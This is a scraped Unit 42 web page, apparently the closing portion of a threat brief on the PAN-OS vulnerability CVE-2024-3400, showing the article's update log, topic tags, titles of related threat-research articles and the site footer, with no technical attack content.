* Updated April 19, 2024, at 12:45 p.m. PT to heavily revise the Current Scope of Attack section as well the section on Operation MidnightEclipse activity (UPSTYLE and Cron Job Backdoor Activity).
* Updated April 22, 2024, at 3:15 p.m. PT to more thoroughly define the levels of activity seen in the Current Scope of the Attack section.
* Updated April 23, 2024, at 7:40 a.m. PT to add language to recommendations for Level 2 and Level 3 in Scope of Attack section. Clarified language in Guidance section. Added Update Log section.
* Updated Apr 24, 2024, at 7:10 a.m. PT to include a link to a Customer Support Portal Knowledge Base article.
* Updated April 24, 2024, at 6:15 p.m. PT to include updated XQL queries for hits for known IoCs in NGFW traffic and in XDR telemetry and NGFW telemetry.
* Updated April 25, 2024, at 8:00 a.m. PT to add Knowledge Base article to Additional Resources.
* Updated April 26, 2024, at 12:22 p.m. PT for clarity and consistency.
* Updated April 29, 2024, at 6:52 a.m. to add Unit 42 Threat Vector podcast on the vulnerability to Additional Resources.
* Updated April 29, 2024, at 11:55 a.m. PT to update exploitation status about proof of concept by third parties of post-exploit persistence techniques.
* Updated May 1, 2024, at 8:05 a.m. PT for clarity and consistency.
* Updated May 3, 2024, at 7:25 a.m. PT to note additional mitigation information for customers was added to the Security Advisory.
* Updated May 20, 2024, at 8:10 a.m. PT to adjust second threat hunting query.

Back to top
### Tags

* [Backdoor](https://unit42.paloaltonetworks.com/tag/backdoor/ "backdoor")
* [Command injection](https://unit42.paloaltonetworks.com/tag/command-injection/ "Command injection")
* [CVE-2024-3400](https://unit42.paloaltonetworks.com/tag/cve-2024-3400/ "CVE-2024-3400")
* [MidnightEclipse](https://unit42.paloaltonetworks.com/tag/midnighteclipse/ "MidnightEclipse")
* [Python](https://unit42.paloaltonetworks.com/tag/python/ "Python")
* [Upstyle](https://unit42.paloaltonetworks.com/tag/upstyle/ "Upstyle")

[Threat Research Center](https://unit42.paloaltonetworks.com "Threat Research")
[Next: Muddled Libra’s Evolution to the Cloud](https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud/ "Muddled Libra’s Evolution to the Cloud")

### Table of Contents

### Related Articles

* [Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/ "article - table of contents")
* [Silent Skimmer Gets Loud (Again)](https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/ "article - table of contents")
* [Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/ "article - table of contents")

## Related Resources

![A pictorial representation of a jailbreaking technique. Abstract digital tunnel with glowing blue lights and intricate patterns, representing data or technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 31, 2024
[#### Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability](https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/)

* [GenAI](https://unit42.paloaltonetworks.com/tag/genai/ "GenAI")
* [Prompt injection](https://unit42.paloaltonetworks.com/tag/prompt-injection/ "prompt injection")
* [Jailbroken](https://unit42.paloaltonetworks.com/tag/jailbroken/ "jailbroken")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/ "Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability")

![Pictorial representation of using LLMs to obfuscate malicious JavaScript detection. A man wearing glasses, looking intently at a screen with reflections visible in the glasses of computer code.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 20, 2024
[#### Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript](https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/)

* [Credential stealer](https://unit42.paloaltonetworks.com/tag/credential-stealer/ "credential stealer")
* [Data Augmentation](https://unit42.paloaltonetworks.com/tag/data-augmentation/ "Data Augmentation")
* [FraudGPT](https://unit42.paloaltonetworks.com/tag/fraudgpt/ "FraudGPT")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/ "Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript")

![Pictorial representation of attackers leveraging Active Directory or LDAP. Close-up view of a server rack panel with illuminated lights and a digital display reading 'SYSTEM HACKED'.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 17, 2024
[#### LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory](https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/)

* [Stately Taurus](https://unit42.paloaltonetworks.com/tag/stately-taurus/ "Stately Taurus")
* [ALPHV](https://unit42.paloaltonetworks.com/tag/alphv/ "ALPHV")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/ "LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory")

![Pictorial representation of HeartCrypt. A laptop on a desk displaying a vivid graphical interface with cyber security and data analytics themes, illuminated by red ambient lighting.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 13, 2024
[#### Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation](https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/)

* [Redline infostealer](https://unit42.paloaltonetworks.com/tag/redline-infostealer/ "Redline infostealer")
* [Lumma Stealer](https://unit42.paloaltonetworks.com/tag/lumma-stealer/ "Lumma Stealer")
* [Remcos](https://unit42.paloaltonetworks.com/tag/remcos/ "Remcos")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/ "Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation")

![Pictorial representation of suspicious registration scam campaigns. Close-up image of a glowing red WiFi connectivity symbol on a textured black surface, symbolizing digital security technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) December 6, 2024
[#### Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams](https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/)

* [Network scanning](https://unit42.paloaltonetworks.com/tag/network-scanning/ "network scanning")
* [Cybersquatting](https://unit42.paloaltonetworks.com/tag/cybersquatting/ "cybersquatting")
* [ChatGPT](https://unit42.paloaltonetworks.com/tag/chatgpt/ "ChatGPT")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/suspicious-domain-registration-campaigns/ "Network Abuses Leveraging High-Profile Events: Suspicious Domain Registrations and Other Scams")

![Pictorial representation of vulnerabilities such as CVE-2024-0012 and CVE-2024-9474. A panoramic nighttime view of city skyline with illuminated high-rise buildings and vibrant lights.]()

[![ category icon]()High Profile Threats](https://unit42.paloaltonetworks.com/category/top-cyberthreats/) November 22, 2024
[#### Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)](https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/)

* [PAN-OS](https://unit42.paloaltonetworks.com/tag/pan-os/ "PAN-OS")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/ "Threat Brief: Operation Lunar Peek, Activity Related to CVE-2024-0012 and CVE-2024-9474 (Updated Nov. 22)")

![Close-up of a person wearing glasses, reflecting computer code on the lens.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 22, 2024
[#### Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/)

* [Remote Code Execution](https://unit42.paloaltonetworks.com/tag/remote-code-execution/ "Remote Code Execution")
* [Python](https://unit42.paloaltonetworks.com/tag/python/ "Python")
* [MacOS](https://unit42.paloaltonetworks.com/tag/macos/ "macOS")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/ "Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples")

![Pictorial representation of FrostyGoop malware. Close-up view of a digital screen displaying a pixelated, abstract image, possibly representing a face.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 19, 2024
[#### FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/)

* [BUSTLEBERM](https://unit42.paloaltonetworks.com/tag/bustleberm/ "BUSTLEBERM")
* [FrostyGoop](https://unit42.paloaltonetworks.com/tag/frostygoop/ "FrostyGoop")
* [Go](https://unit42.paloaltonetworks.com/tag/go/ "Go")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/ "FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications")

![Pictorial representation of a threat like the Bring Your Own Vulnerable Driver (BYOVD) technique. Image of computer code on a screen with a prominent biohazard symbol.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) November 1, 2024
[#### TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit](https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/)

* [Extortion](https://unit42.paloaltonetworks.com/tag/extortion/ "Extortion")
* [Data exfiltration](https://unit42.paloaltonetworks.com/tag/data-exfiltration/ "data exfiltration")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/edr-bypass-extortion-attempt-thwarted/ "TA Phone Home: EDR Evasion Testing Reveals Extortion Actor's Toolkit")

![A pictorial representation of jailbreaking a large language model. A glowing cube with the letters "AI" illuminated in blue, surrounded by a network of interconnected circuits and data lines, representing artificial intelligence technology.]()

[![ category icon]()Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/) October 23, 2024
[#### Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction](https://unit42.paloaltonetworks.com/jailbreak-llms-through-camouflage-distraction/)

* [Jailbroken](https://unit42.paloaltonetworks.com/tag/jailbroken/ "jailbroken")
* [LLM](https://unit42.paloaltonetworks.com/tag/llm/ "LLM")
* [GenAI](https://unit42.paloaltonetworks.com/tag/genai/ "GenAI")

[Read now ![Right arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg)](https://unit42.paloaltonetworks.com/jailbreak-llms-through-camouflage-distraction/ "Deceptive Delight: Jailbreak LLMs Through Camouflage and Distraction")

* ![Slider arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg)
* ![Slider arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg)

![Close button](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg)
![Enlarged Image]()

![Newsletter]()

![UNIT 42 Small Logo]()
Get updates from Unit 42
## Peace of mind comes from staying ahead of threats. Contact us today.

Your Email

Subscribe for email updates to all Unit 42 threat research.
By submitting this form, you agree to our [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use "Terms of Use") and acknowledge our [Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/privacy "Privacy Statement")

Invalid captcha!

Subscribe ![Right Arrow]()
![loader](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg)

### Products and services

* [Network Security Platform](https://www.paloaltonetworks.com/network-security "Network Security Platform")
* [CLOUD DELIVERED SECURITY SERVICES](https://www.paloaltonetworks.com/network-security/security-subscriptions "CLOUD DELIVERED SECURITY SERVICES")
* [Advanced Threat Prevention](https://www.paloaltonetworks.com/network-security/advanced-threat-prevention "Advanced Threat Prevention")
* [DNS Security](https://www.paloaltonetworks.com/network-security/advanced-dns-security "DNS Security")
* [Data Loss Prevention](https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention "Data Loss Prevention")
* [IoT Security](https://www.paloaltonetworks.com/network-security/enterprise-iot-security "IoT Security")

* [Next-Generation Firewalls](https://www.paloaltonetworks.com/network-security/next-generation-firewall "Next-Generation Firewalls")
* [Hardware Firewalls](https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware "Hardware Firewalls")
* [Strata Cloud Manager](https://www.paloaltonetworks.com/network-security/strata-cloud-manager "Strata Cloud Manager")

* [SECURE ACCESS SERVICE EDGE](https://www.paloaltonetworks.com/sase "SECURE ACCESS SERVICE EDGE")
* [Prisma Access](https://www.paloaltonetworks.com/sase/access "Prisma Access")
* [Prisma SD-WAN](https://www.paloaltonetworks.com/sase/sd-wan "Prisma SD-WAN")
* [Autonomous Digital Experience Management](https://www.paloaltonetworks.com/sase/adem "Autonomous Digital Experience Management")
* [Cloud Access Security Broker](https://www.paloaltonetworks.com/sase/next-gen-casb "Cloud Access Security Broker")
* [Zero Trust Network Access](https://www.paloaltonetworks.com/sase/ztna "Zero Trust Network Access")

* [Code to Cloud Platform](https://www.paloaltonetworks.com/prisma/whyprisma "Code to Cloud Platform")
* [Prisma Cloud](https://www.paloaltonetworks.com/prisma/cloud "Prisma Cloud")
* [Cloud-Native Application Protection Platform](https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform "Cloud-Native Application Protection Platform")

* [AI-Driven Security Operations Platform](https://www.paloaltonetworks.com/cortex "AI-Driven Security Operations Platform")
* [Cortex XDR](https://www.paloaltonetworks.com/cortex/cortex-xdr "Cortex XDR")
* [Cortex XSOAR](https://www.paloaltonetworks.com/cortex/cortex-xsoar "Cortex XSOAR")
* [Cortex Xpanse](https://www.paloaltonetworks.com/cortex/cortex-xpanse "Cortex Xpanse")
* [Cortex XSIAM](https://www.paloaltonetworks.com/cortex/cortex-xsiam "Cortex XSIAM")
* [External Attack Surface Protection](https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management "External Attack Surface Protection")
* [Security Automation](https://www.paloaltonetworks.com/cortex/security-operations-automation "Security Automation")
* [Threat Prevention, Detection & Response](https://www.paloaltonetworks.com/cortex/detection-and-response "Threat Prevention, Detection & Response")

* [Threat Intel and Incident Response Services](https://www.paloaltonetworks.com/unit42 "Threat Intel and Incident Response Services")
* [Proactive Assessments](https://www.paloaltonetworks.com/unit42/assess "Proactive Assessments")
* [Incident Response](https://www.paloaltonetworks.com/unit42/respond "Incident Response")
* [Transform Your Security Strategy](https://www.paloaltonetworks.com/unit42/transform "Transform Your Security Strategy")
* [Discover Threat Intelligence](https://www.paloaltonetworks.com/unit42/threat-intelligence-partners "Discover Threat Intelligence")

### Company

* [About Us](https://www.paloaltonetworks.com/about-us "About Us")
* [Careers](https://jobs.paloaltonetworks.com/en/ "Careers")
* [Contact Us](https://www.paloaltonetworks.com/company/contact-sales "Contact Us")
* [Corporate Responsibility](https://www.paloaltonetworks.com/about-us/corporate-responsibility "Corporate Responsibility")
* [Customers](https://www.paloaltonetworks.com/customers "Customers")
* [Investor Relations](https://investors.paloaltonetworks.com/ "Investor Relations")
* [Location](https://www.paloaltonetworks.com/about-us/locations "Location")
* [Newsroom](https://www.paloaltonetworks.com/company/newsroom "Newsroom")

### Popular links

* [Blog](https://www.paloaltonetworks.com/blog/ "Blog")
* [Communities](https://www.paloaltonetworks.com/communities "Communities")
* [Content Library](https://www.paloaltonetworks.com/resources "Content Library")
* [Cyberpedia](https://www.paloaltonetworks.com/cyberpedia "Cyberpedia")
* [Event Center](https://events.paloaltonetworks.com/ "Event Center")
* [Manage Email Preferences](https://start.paloaltonetworks.com/preference-center "Manage Email Preferences")
* [Products A-Z](https://www.paloaltonetworks.com/products/products-a-z "Products A-Z")
* [Product Certifications](https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs "Product Certifications")
* [Report a Vulnerability](https://www.paloaltonetworks.com/security-disclosure "Report a Vulnerability")
* [Sitemap](https://www.paloaltonetworks.com/sitemap "Sitemap")
* [Tech Docs](https://docs.paloaltonetworks.com/ "Tech Docs")
* [Unit 42](https://unit42.paloaltonetworks.com/ "Unit 42")
* [Do Not Sell or Share My Personal Information](https://panwedd.exterro.net/portal/dsar.htm?target=panwedd "Do Not Sell or Share My Personal Information")

[![](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg)](https://www.paloaltonetworks.com/ "Footer Nav")

* [Privacy](https://www.paloaltonetworks.com/legal-notices/privacy "Privacy")
* [Trust Center](https://www.paloaltonetworks.com/legal-notices/trust-center "Trust Center")
* [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use "Terms of Use")
* [Documents](https://www.paloaltonetworks.com/legal "Documents")

Copyright © 2025 Palo Alto Networks. All Rights Reserved

* [![YouTube]()](https://www.youtube.com/user/paloaltonetworks "YouTube")
* [![Twitter]()](https://twitter.com/Unit42_Intel "X")
* [![Facebook]()](https://www.facebook.com/PaloAltoNetworks/ "Facebook")
* [![LinkedIn]()](https://www.linkedin.com/company/palo-alto-networks "LinkedIn")
* [![Podcast]()](https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/ "Podcast")

![Globe icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg)
EN
![Down arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg)

* Select your language
* [USA (ENGLISH)](https://unit42.paloaltonetworks.com/cve-2024-3400/)
* [JAPAN (日本語)](https://unit42.paloaltonetworks.jp/cve-2024-3400/)

![Play](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg)
![Pause](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg)

![Minimize](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg)

![Close button](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg)

Your browser does not support the video tag.

### Default Heading

Read the article
![Right Arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg)

Seekbar

![Play](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg)
![Pause](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg)

![Volume](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg)

Volume

![Minimize](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg)

